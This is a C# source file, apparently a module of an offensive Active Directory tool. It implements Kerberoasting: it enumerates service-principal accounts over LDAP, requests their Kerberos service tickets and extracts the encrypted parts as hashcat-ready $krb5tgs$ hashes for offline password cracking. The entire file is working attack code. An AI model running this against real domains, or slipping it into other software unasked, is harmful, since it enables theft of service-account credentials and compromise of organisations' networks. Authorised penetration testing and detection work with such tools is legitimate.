using Asn1;
using Corellia.Interfaces;
using Corellia.Structure;
using Corellia.Utilities;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IdentityModel.Tokens;
using System.Net;
using System.Security.Principal;

namespace Corellia.Modules
{
    internal class Kerberoast : IModules
    {
        public Enums.Mode Mode => Enums.Mode.Domain;

        private static byte[] GetToken(string spn)
        {
            try
            {
                KerberosRequestorSecurityToken token;
                if (Config.CredsPresent())
                {
                    NetworkCredential cred;
                    cred = new NetworkCredential(Config.Username, Config.Password, Config.Domain);
                    token = new KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                }
                else
                {
                    token = new KerberosRequestorSecurityToken(spn);
                }
                return token.GetRequest();
            }
            catch (Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, e.Message);
            }
            return new byte[0];
        }

        private static List<SPN> GetSPNs()
        {
            List<SPN> spns = new List<SPN>();
            string server = Network.LDAP.DetermineLDAPServer();
            try
            {
                using (var context = new PrincipalContext(ContextType.Domain, Config.Domain))
                {
                    using (DirectoryEntry domainEntry = new DirectoryEntry("LDAP://" + server, Config.Username, Config.Password))
                    {
                        using (var searcher = new DirectorySearcher(domainEntry))
                        {
                            searcher.Filter = "(servicePrincipalName=*)";
                            using (var results = searcher.FindAll())
                            {
                                foreach (SearchResult result in results)
                                {
                                    ResultPropertyCollection properties = result.Properties;
                                    string username = properties["samaccountname"][0].ToString();
                                    if (username.EndsWith("$") || username.ToLower().Equals("krbtgt"))
                                    {
                                        continue;
                                    }

                                    string spn = properties["serviceprincipalname"][0].ToString();

                                    SPN servicePrincipalName = new SPN
                                    {
                                        Username = username,
                                        Domain = Config.Domain,
                                        Hash = "",
                                        EncType = "",
                                        ServicePrincipalName = spn,
                                        Token = GetToken(spn)
                                    };
                                    if (!spns.Contains(servicePrincipalName))
                                    {
                                        spns.Add(servicePrincipalName);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, e.Message);
            }
            return spns;
        }

        private static SPN ExtractTicket(SPN spn)
        {
            string encryptionType, hashcatFormat;
            long encTypeToken = 0;
            byte[] tokenBytes = spn.Token;
            byte[] apRequest = new byte[tokenBytes.Length - 17];
            Array.Copy(tokenBytes, 17, apRequest, 0, tokenBytes.Length - 17);
            AsnElt apRep = AsnElt.Decode(apRequest);
            foreach (AsnElt elem in apRep.Sub[0].Sub)
            {
                if (elem.TagValue == 3)
                {
                    foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                    {
                        if (elem2.TagValue == 3)
                        {
                            foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                            {
                                if (elem3.TagValue == 0)
                                {
                                    encTypeToken = elem3.Sub[0].GetInteger();
                                }
                                if (elem3.TagValue == 2)
                                {
                                    byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                    string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                    if (encTypeToken == 17)
                                    {
                                        encryptionType = "aes128-cts-hmac-sha1-96";
                                        hashcatFormat = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encTypeToken, spn.Username, spn.Domain, spn.ServicePrincipalName, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        spn.EncType = encryptionType;
                                        spn.Hash = hashcatFormat;
                                    }
                                    if (encTypeToken == 18)
                                    {
                                        encryptionType = "aes256-cts-hmac-sha1-96";
                                        hashcatFormat = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encTypeToken, spn.Username, spn.Domain, spn.ServicePrincipalName, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        spn.EncType = encryptionType;
                                        spn.Hash = hashcatFormat;
                                    }
                                    if (encTypeToken == 23)
                                    {
                                        encryptionType = "rc4-hmac";
                                        int checksumStart = cipherText.Length - 24;
                                        hashcatFormat = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encTypeToken, spn.Username, spn.Domain, spn.ServicePrincipalName, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        spn.EncType = encryptionType;
                                        spn.Hash = hashcatFormat;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return spn;
        }

        public static List<SPN> Roast()
        {
            List<SPN> spns = GetSPNs();
            List<SPN> hashesObtained = new List<SPN>();
            if (spns.Count == 0)
            {
                return spns;
            }
            foreach (SPN spn in spns)
            {
                SPN updated = ExtractTicket(spn);
                if (!string.IsNullOrEmpty(updated.Hash))
                {
                    if (!hashesObtained.Contains(updated))
                    {
                        hashesObtained.Add(updated);
                    }
                }
            }
            Logger.PrintSPNs(hashesObtained);
            return hashesObtained;
        }
    }
}